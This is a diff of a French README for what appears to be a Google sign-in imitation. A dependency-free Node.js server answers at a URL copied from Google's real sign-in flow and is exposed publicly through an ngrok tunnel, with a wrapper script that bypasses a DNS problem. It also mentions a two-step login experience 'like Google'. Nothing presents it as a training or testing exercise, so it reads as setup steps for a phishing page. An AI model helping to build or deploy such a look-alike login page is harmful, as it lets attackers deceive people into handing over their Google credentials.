@@ -10,7 +10,7 @@ et un **tunnel réseau `ngrok`**.
 ## Stack
 - HTML · CSS · JavaScript (navigateur) — Tailwind CDN (CSS) + JS natif
 - Node.js (`http`, `fs`, `path`, `url`) — modules natifs, **zéro dépendance npm**
-- `ngrok` pour le tunnel public
+- `ngrok` + `ngrok-wrapper.sh` pour le tunnel public (bypass DNS systemd-resolved)
 
 ## Lancement local
 
@@ -25,17 +25,20 @@ npm start          # → écoute sur http://localhost:3000
 Dans un second terminal :
 
 ```bash
-ngrok http 3000
-# → https://<aléatoire>.ngrok.io
+./ngrok-wrapper.sh 3000
+# → https://<aléatoire>.ngrok-free.dev
 ```
 
-> 📝 *Le flag `--host-header` est déprécié dans ngrok v3. Le serveur Node ignore l'en-tête `Host`
-> (il ne lit que le `pathname`), donc le tunnel fonctionne sans cette option.*
+> 📝 **Workaround DNS systemd-resolved** : si `ngrok http 3000` échoue avec
+> `dial tcp: lookup connect.ngrok-agent.com: i/o timeout`, le wrapper pré-résout
+> les hostnames ngrok via DNS public (8.8.8.8) et utilise `bwrap` pour monter
+> un `/etc/hosts` & `/etc/resolv.conf` custom dans un namespace. Le serveur
+> Node ignore l'en-tête `Host` (il ne lit que le `pathname`).
 
 Puis ouvrez l’URL **longue style Google** (le serveur répond à ce chemin) :
 
 ```
-https://<aléatoire>.ngrok.io/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-684035207%3A1786225401411884&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=Ac50bxt5aymdFYKXw-3UoRQ0Bpv7ft0-gjpTEmhCbbk5oU9lf4JLITrg_MBtV8cXMFjGLRkKTavp-Q
+https://<aléatoire>.ngrok-free.dev/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-684035207%3A1786225401411884&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=Ac50bxt5aymdFYKXw-3UoRQ0Bpv7ft0-gjpTEmhCbbk5oU9lf4JLITrg_MBtV8cXMFjGLRkKTavp-Q
 ```
 
 ## UX — Double étape (comme Google)
